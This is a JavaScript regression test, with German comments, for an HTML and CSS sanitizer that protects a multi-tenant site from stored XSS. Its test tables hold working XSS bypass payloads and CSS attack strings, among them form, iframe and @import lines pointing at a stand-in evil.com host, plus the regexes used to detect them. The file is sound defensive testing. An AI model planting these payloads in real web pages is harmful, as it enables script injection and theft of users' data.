// Regressionstest für lib/sanitize.ts — die einzige Verteidigung gegen
// Stored XSS auf allen Kundenseiten (und www.getvariante.com selbst).
//
// Plan SEC-01, NEW-03. Jeder Bypass hier ist ein erneuter Cross-Tenant-XSS.
// Ausführen: node --import tsx __tests__/sanitize.mjs
// Oder via npm: in package.json unter test:node aufnehmen.

import { sanitizeHtml, sanitizeCss } from '../lib/sanitize.ts'

// ── HTML-Bypässe, die die alte Regex-basierte Version durchließen ──

const HTML_TESTS = [
  { input: '<img/src=x/onerror=alert(document.domain)>', desc: 'event handler via / separator' },
  { input: '<svg/onload=alert(1)>', desc: 'svg onload' },
  { input: '<a href=javascript:alert(1)>x</a>', desc: 'javascript: URI unquoted' },
  { input: '<a href=&#106;avascript:alert(1)>x</a>', desc: 'HTML-entity javascript: URI' },
  { input: '<form action=//evil.com><button>Login</button></form>', desc: 'form tag' },
  { input: '<scr<script>ipt>alert(1)</scr</script>ipt>', desc: 'script tag splitting' },
  { input: '<iframe src="//evil.com"></iframe>', desc: 'iframe' },
  { input: '<object data="//evil.com"></object>', desc: 'object' },
  { input: '<div onclick="alert(1)">click</div>', desc: 'onclick attribute' },
]

const CSS_TESTS = [
  { input: '@import url("https://evil.com/exfil.css");', desc: 'CSS @import' },
  { input: 'body { background: url(javascript:alert(1)) }', desc: 'CSS url(javascript:)' },
  { input: 'body { width: expression(alert(1)) }', desc: 'CSS expression()' },
  { input: 'body { behavior: url(evil.htc) }', desc: 'CSS behavior' },
  { input: 'body { position: fixed; top: 0; left: 0; width: 100%; height: 100% }', desc: 'position:fixed overlay' },
  { input: '} </style><script>alert(1)</script><style>{', desc: 'style breakout' },
]

const VALID_HTML = [
  { input: '<div class="ab-v"><p>Hello</p><button>Click</button></div>', desc: 'standard variant' },
  { input: '<a href="https://example.com" target="_blank" rel="noopener">Link</a>', desc: 'safe link' },
  { input: '<img src="https://example.com/img.png" alt="pic" width="200" height="100">', desc: 'safe image' },
  { input: '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 2L2 22h20z" fill="#333"/></svg>', desc: 'safe SVG' },
]

const VALID_CSS = [
  { input: '.ab-v { color: red }', desc: 'simple rule' },
  { input: '.ab-v button { background: #333; border: 1px solid #555 }', desc: 'multi-property' },
]

let passed = 0
let failed = 0

for (const { input, desc } of HTML_TESTS) {
  const result = sanitizeHtml(input)
  const isSafe =
    !/<script/i.test(result) &&
    !/on\w+\s*=/i.test(result) &&
    !/javascript:/i.test(result) &&
    !/<iframe/i.test(result) &&
    !/<object/i.test(result) &&
    !/<embed/i.test(result) &&
    !/<form/i.test(result)
  if (isSafe) { passed++ }
  else { failed++; console.error('FAIL HTML [' + desc + ']: "' + input + '" -> "' + result + '"') }
}

for (const { input, desc } of CSS_TESTS) {
  const result = sanitizeCss(input)
  const isSafe =
    !/@import/i.test(result) &&
    !/javascript:/i.test(result) &&
    !/expression\s*\(/i.test(result) &&
    !/behavior/i.test(result) &&
    !/position\s*:\s*fixed/i.test(result) &&
    !/<\/style/i.test(result)
  if (isSafe) { passed++ }
  else { failed++; console.error('FAIL CSS [' + desc + ']: "' + input + '" -> "' + result + '"') }
}

for (const { input, desc } of VALID_HTML) {
  const result = sanitizeHtml(input)
  if (result.length > 0) { passed++ }
  else { failed++; console.error('FALSE POSITIVE HTML [' + desc + ']: sanitized to empty') }
}

for (const { input, desc } of VALID_CSS) {
  const result = sanitizeCss(input)
  if (result.length > 0) { passed++ }
  else { failed++; console.error('FALSE POSITIVE CSS [' + desc + ']: sanitized to empty') }
}

const total = HTML_TESTS.length + CSS_TESTS.length + VALID_HTML.length + VALID_CSS.length
console.log('\n' + passed + ' passed, ' + failed + ' failed (' + total + ' total)')
if (failed > 0) process.exit(1)
